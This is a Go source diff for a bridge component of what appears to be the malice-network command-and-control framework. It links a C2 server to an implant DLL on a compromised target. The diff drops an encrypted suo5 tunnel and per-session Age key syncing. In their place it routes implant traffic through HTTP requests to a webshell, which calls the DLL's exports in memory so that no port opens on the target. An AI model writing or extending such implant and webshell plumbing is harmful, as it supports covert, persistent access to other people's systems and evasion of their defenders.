@@ -9,8 +9,6 @@ import (
 	"sync"
 	"time"
 
-	"strings"
-
 	"github.com/chainreactors/IoM-go/consts"
 	mtls "github.com/chainreactors/IoM-go/mtls"
 	"github.com/chainreactors/IoM-go/proto/client/clientpb"
@@ -19,7 +17,6 @@ import (
 	iomtypes "github.com/chainreactors/IoM-go/types"
 	"github.com/chainreactors/logs"
 	"github.com/chainreactors/malice-network/helper/cryptography"
-	"github.com/chainreactors/malice-network/helper/implanttypes"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/codes"
 	"google.golang.org/grpc/metadata"
@@ -40,8 +37,7 @@ const (
 // The bridge owns the listener runtime only. Custom pipelines are created and
 // controlled through pipeline start/stop events from the server.
 type Bridge struct {
-	cfg       *Config
-	transport dialTransport
+	cfg *Config
 
 	conn      *grpc.ClientConn
 	rpc       listenerrpc.ListenerRPCClient
@@ -52,29 +48,19 @@ type Bridge struct {
 }
 
 type pipelineRuntime struct {
-	name         string
-	ctx          context.Context
-	cancel       context.CancelFunc
-	spiteStream  listenerrpc.ListenerRPC_SpiteStreamClient
-	sendMu       sync.Mutex
-	sessions     sync.Map // sessionID -> *Session
-	sessionsByRawID sync.Map // rawSID (uint32) -> *Session (for CtrlListenerSyncSession lookup)
-	streamTasks  sync.Map // "sessionID:taskID" -> context.CancelFunc (pump goroutine)
-	secureConfig *implanttypes.SecureConfig
-	done         chan struct{}
+	name        string
+	ctx         context.Context
+	cancel      context.CancelFunc
+	spiteStream listenerrpc.ListenerRPC_SpiteStreamClient
+	sendMu      sync.Mutex
+	sessions    sync.Map // sessionID -> *Session
+	streamTasks sync.Map // "sessionID:taskID" -> context.CancelFunc (pump goroutine)
+	done        chan struct{}
 }
 
 // NewBridge creates a new bridge instance.
 func NewBridge(cfg *Config) (*Bridge, error) {
-	transport, err := NewTransport(cfg.Suo5URL)
-	if err != nil {
-		return nil, fmt.Errorf("init transport: %w", err)
-	}
-
-	return &Bridge{
-		cfg:       cfg,
-		transport: transport,
-	}, nil
+	return &Bridge{cfg: cfg}, nil
 }
 
 // Start runs the bridge lifecycle:
@@ -118,14 +104,15 @@ func (b *Bridge) Start(parent context.Context) error {
 	return b.runJobLoop(ctx)
 }
 
-// connectDLL establishes a malefic channel to the bind DLL on the target
-// through the suo5 tunnel. Retries with exponential backoff up to
-// retryMaxAttempts before giving up.
+// connectDLL establishes a channel to the DLL on the target.
+// Sends HTTP requests to the webshell which calls DLL exports directly
+// via function pointers (memory channel). No TCP port opened on target.
+// Retries with exponential backoff up to retryMaxAttempts before giving up.
 func (b *Bridge) connectDLL(ctx context.Context, runtime *pipelineRuntime) error {
 	sessionID := cryptography.RandomString(8)
-	channel := NewChannel(b.transport, b.cfg.DLLAddr, runtime.name)
 
-	logs.Log.Importantf("waiting for DLL at %s ...", b.cfg.DLLAddr)
+	channel := NewChannel(b.cfg.WebshellHTTPURL(), b.cfg.StageToken)
+	logs.Log.Importantf("waiting for DLL at %s ...", b.cfg.WebshellHTTPURL())
 
 	delay := retryBaseDelay
 	for attempt := 1; attempt <= retryMaxAttempts; attempt++ {
@@ -154,16 +141,8 @@ func (b *Bridge) connectDLL(ctx context.Context, runtime *pipelineRuntime) error
 		}
 		break
 	}
-	logs.Log.Important("DLL connected via malefic channel")
 
-	// Inject Age keys before Handshake so the parser can decrypt/encrypt.
-	if runtime.secureConfig != nil && runtime.secureConfig.Enable {
-		keyPair := buildInitialKeyPair(runtime.secureConfig)
-		if keyPair != nil {
-			channel.WithSecure(keyPair)
-			logs.Log.Debugf("Age secure mode active for DLL channel")
-		}
-	}
+	logs.Log.Important("DLL connected via memory channel")
 
 	sess, err := NewSession(
 		b.rpc, b.pipelineCtx(ctx, runtime.name),
@@ -177,27 +156,7 @@ func (b *Bridge) connectDLL(ctx context.Context, runtime *pipelineRuntime) error
 
 	channel.StartRecvLoop()
 	runtime.sessions.Store(sess.ID, sess)
-	runtime.sessionsByRawID.Store(channel.sessionID, sess)
 	return nil
-}
-
-// buildInitialKeyPair assembles a KeyPair from the pipeline's SecureConfig.
-// PrivateKey = server private key (to decrypt DLL messages).
-// PublicKey = implant public key (to encrypt messages to DLL).
-// This mirrors core.GetKeyPairForSession without per-session lookup.
-func buildInitialKeyPair(sc *implanttypes.SecureConfig) *clientpb.KeyPair {
-	if sc == nil || !sc.Enable {
-		return nil
-	}
-	pub := strings.TrimSpace(sc.ImplantPublicKey)
-	priv := strings.TrimSpace(sc.ServerPrivateKey)
-	if pub == "" && priv == "" {
-		return nil
-	}
-	return &clientpb.KeyPair{
-		PublicKey:  pub,
-		PrivateKey: priv,
-	}
 }
 
 // connect establishes the mTLS gRPC connection to the server.
@@ -256,13 +215,6 @@ func (b *Bridge) runJobLoop(ctx context.Context) error {
 			return fmt.Errorf("job stream recv: %w", err)
 		}
 
-		// Handle session key sync without sending a status response,
-		// matching the real listener behavior (server/listener/listener.go:360).
-		if msg.GetCtrl() == consts.CtrlListenerSyncSession {
-			b.handleSyncSession(msg.GetSession())
-			continue
-		}
-
 		statusMsg := b.handleJobCtrl(ctx, msg)
 		if err := b.jobStream.Send(statusMsg); err != nil {
 			if ctx.Err() != nil {
@@ -315,18 +267,12 @@ func (b *Bridge) handlePipelineStart(ctx context.Context, job *clientpb.Job) err
 		return err
 	}
 
-	secCfg := implanttypes.FromSecure(pipe.GetSecure())
-	if secCfg.Enable {
-		logs.Log.Importantf("pipeline %s: Age secure mode enabled", pipe.GetName())
-	}
-
 	runtimeCtx, cancel := context.WithCancel(ctx)
 	runtime := &pipelineRuntime{
-		name:         pipe.GetName(),
-		ctx:          runtimeCtx,
-		cancel:       cancel,
-		secureConfig: secCfg,
-		done:         make(chan struct{}),
+		name:   pipe.GetName(),
+		ctx:    runtimeCtx,
+		cancel: cancel,
+		done:   make(chan struct{}),
 	}
 
 	b.activeMu.Lock()
@@ -351,7 +297,7 @@ func (b *Bridge) handlePipelineStart(ctx context.Context, job *clientpb.Job) err
 	runtime.spiteStream = spiteStream
 
 	go b.runRuntime(runtime)
-	logs.Log.Importantf("pipeline %s starting; waiting for DLL at %s", runtime.name, b.cfg.DLLAddr)
+	logs.Log.Importantf("pipeline %s starting; waiting for DLL at %s", runtime.name, b.cfg.WebshellHTTPURL())
 	return nil
 }
 
@@ -377,53 +323,6 @@ func (b *Bridge) handlePipelineSync(job *clientpb.Job) error {
 	}
 	logs.Log.Debugf("pipeline %s sync acknowledged", name)
 	return nil
-}
-
-// handleSyncSession processes CtrlListenerSyncSession from the server.
-// The server pushes per-session Age key pairs after a session registers with
-// secure mode enabled. We update the channel's parser so subsequent
-// reads/writes use the session-specific keys.
-func (b *Bridge) handleSyncSession(sess *clientpb.Session) {
-	if sess == nil {
-		return
-	}
-
-	b.activeMu.Lock()
-	runtime := b.active
-	b.activeMu.Unlock()
-	if runtime == nil {
-		return
-	}
-
-	rawID := sess.GetRawId()
-	val, ok := runtime.sessionsByRawID.Load(rawID)
-	if !ok {
-		logs.Log.Debugf("sync session: no session for raw ID %d", rawID)
-		return
-	}
-
-	session := val.(*Session)
-	kp := sess.GetKeyPair()
-	if kp == nil || (kp.GetPublicKey() == "" && kp.GetPrivateKey() == "") {
-		logs.Log.Debugf("sync session %s: no key pair, skipping", session.ID)
-		return
-	}
-
-	// Merge: session-specific private key takes priority, fall back to pipeline's.
-	merged := &clientpb.KeyPair{
-		PublicKey:  kp.GetPublicKey(),
-		PrivateKey: kp.GetPrivateKey(),
-	}
-	if runtime.secureConfig != nil {
-		pipelinePriv := strings.TrimSpace(runtime.secureConfig.ServerPrivateKey)
-		sessionPriv := strings.TrimSpace(kp.GetPrivateKey())
-		if pipelinePriv != "" && sessionPriv != pipelinePriv {
-			merged.PrivateKey = sessionPriv + "\n" + pipelinePriv
-		}
-	}
-
-	session.channel.WithSecure(merged)
-	logs.Log.Debugf("sync session %s: Age keys updated (rawID=%d)", session.ID, rawID)
 }
 
 func (b *Bridge) jobPipelineName(job *clientpb.Job) (string, error) {
